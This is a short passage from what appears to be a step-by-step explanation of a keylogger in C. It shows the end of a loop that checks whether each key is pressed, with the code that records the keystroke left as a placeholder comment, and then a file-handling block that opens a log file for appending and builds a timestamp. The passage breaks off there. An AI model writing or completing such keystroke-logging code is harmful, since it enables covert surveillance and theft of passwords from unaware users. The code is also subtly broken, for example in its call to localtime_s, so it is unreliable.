         if (result & 0x1) { // If the key is pressed
             // Record the keystroke and write to file
             // ... (code to log the key and time)
         }
     }
     ```

   - **File Handling**:
     ```c
     // Open file in append mode
     FILE *file = fopen(FILENAME, "a");
     if (file) {
         char time[20];
         struct tm *time_struct;
         time_t now;
         time(&now);
         localtime_s(&time_struct, &now);
         strftime(time, sizeof(time), "%Y-%m-%d %H:%M:%S", time_struct);
